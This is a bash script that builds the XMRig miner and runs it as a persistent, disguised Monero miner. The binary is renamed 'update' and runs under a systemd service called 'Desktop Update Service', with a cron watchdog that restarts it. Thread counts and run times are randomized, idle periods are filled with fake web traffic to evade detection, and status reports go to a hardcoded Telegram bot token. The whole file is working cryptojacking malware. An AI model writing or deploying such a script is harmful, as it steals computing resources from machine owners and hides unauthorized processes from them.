#!/bin/bash

# Unlock any previously stuck or locked miner file
fuser -k ~/Documents/build/update 2>/dev/null || true
rm -f ~/Documents/build/update 2>/dev/null || true

# Load variables
WALLET="84QEvQ9V25mUNDiMXmq1aF96FwpzDPg4R1d564MjhvxrNpz7rizA3Q3FUowb83rsBK8P9DnDQnk4hTED57Ycd4p1Q8uRzZz"
WORKER="$1"
POOL="pool.supportxmr.com:443"
LOG_FILE="$HOME/desktop.log"
MINER_PATH="$HOME/Documents/build/update"
WRAPPER_SCRIPT="$HOME/desktop-update-wrapper.sh"
BOT_TOKEN="7828954337:AAHFZPTv5znzf2LcR5sIO3bHBMDWM7hFB3k"
CHAT_ID="7107536205"

# Install dependencies silently, ignore if already satisfied
sudo apt update -y && sudo apt install -y git curl tmux cron build-essential cmake libuv1-dev libssl-dev libhwloc-dev 2>/dev/null || true

# Clone and build xmrig only if not already built
if [ ! -f "$MINER_PATH" ]; then
  rm -rf ~/Documents/xmrig
  mkdir -p ~/Documents/build
  cd ~/Documents
  git clone https://github.com/xmrig/xmrig.git
  cd xmrig && mkdir build && cd build
  cmake .. -DWITH_HWLOC=OFF
  make -j$(nproc)
  cp xmrig "$MINER_PATH"
  chmod +x "$MINER_PATH"
fi

# Write wrapper script with mining/sleep cycling and Telegram alerts
cat > "$WRAPPER_SCRIPT" <<EOF
#!/bin/bash
SESSION="miner"
if ! tmux has-session -t \$SESSION 2>/dev/null; then
  tmux new-session -d -s \$SESSION
fi
while true; do
  MIN_TIME=720
  MAX_TIME=1020
  MIN_THREADS=12
  MAX_THREADS=16
  MIN_SLEEP=20
  MAX_SLEEP=130
  THREADS=\$((RANDOM % (MAX_THREADS - MIN_THREADS + 1) + MIN_THREADS))
  TIME=\$((RANDOM % (MAX_TIME - MIN_TIME + 1) + MIN_TIME))
  SLEEP=\$((RANDOM % (MAX_SLEEP - MIN_SLEEP + 1) + MIN_SLEEP))
  curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d chat_id="$CHAT_ID" -d text="[\$WORKER] ⛏️ Mining for \$((TIME/60))m with \$THREADS threads"
  tmux send-keys -t \$SESSION "$MINER_PATH -o $POOL -u $WALLET -p \$WORKER --tls --threads=\$THREADS --coin=monero --donate-level=1 >> $LOG_FILE 2>&1" C-m
  sleep \$TIME
  pkill -f "$MINER_PATH"
  curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d chat_id="$CHAT_ID" -d text="[\$WORKER] 😴 Sleeping \$SLEEP sec with activity"
  for ((i=0; i<\$SLEEP; i++)); do
    curl -s https://google.com > /dev/null
    sleep 1
  done
done
EOF

chmod +x "$WRAPPER_SCRIPT"

# Systemd service setup
SERVICE_FILE="/etc/systemd/system/desktop-update.service"
sudo bash -c "cat > \$SERVICE_FILE" <<EOF
[Unit]
Description=Desktop Update Service
After=network.target

[Service]
ExecStart=$WRAPPER_SCRIPT
Restart=always
RestartSec=5
Nice=10
CPUWeight=70
TimeoutStartSec=30
StartLimitIntervalSec=0

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable desktop-update.service
sudo systemctl restart desktop-update.service

# Cron health checker setup
CHECKER="/usr/local/bin/check_miner_alive.sh"
sudo bash -c "cat > \$CHECKER" <<EOF
#!/bin/bash
if ! pgrep -f \"$MINER_PATH\" > /dev/null; then
  sudo systemctl restart desktop-update.service
  curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d chat_id="$CHAT_ID" -d text="[\$WORKER] ⚠️ Auto-restarted miner (not found)"
fi
EOF
sudo chmod +x \$CHECKER
(crontab -l 2>/dev/null; echo "*/5 * * * * \$CHECKER") | crontab -

# Final status display
STATUS=$(systemctl is-active desktop-update.service)
echo "=========================================="
echo "✅ Miner \$WORKER is configured and running"
echo "🛠️  Binary: \$MINER_PATH"
echo "📝 Logs: \$LOG_FILE"
echo "📦 Service: desktop-update [Status: \$STATUS]"
echo "🔁 Restart: sudo systemctl restart desktop-update"
echo "🛑 Stop:    sudo systemctl stop desktop-update"
echo "🔍 Logs:    tail -f \$LOG_FILE"
echo "🧠 Tmux:    tmux attach-session -t miner"
echo "=========================================="
